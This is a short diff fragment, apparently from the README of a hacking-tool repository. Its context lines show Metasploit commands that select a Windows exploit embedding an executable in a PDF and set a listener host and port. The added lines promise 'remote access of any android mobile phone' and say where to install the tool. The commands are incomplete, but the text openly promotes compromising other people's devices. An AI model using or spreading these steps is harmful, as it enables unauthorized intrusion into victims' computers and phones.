@@ -9,3 +9,5 @@ use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs  set lhost  set lport
 set lhost  
 set lport 
 exploit
+get remote access of any android mobile phone
+you can get this repo through kali linux or directly install through github
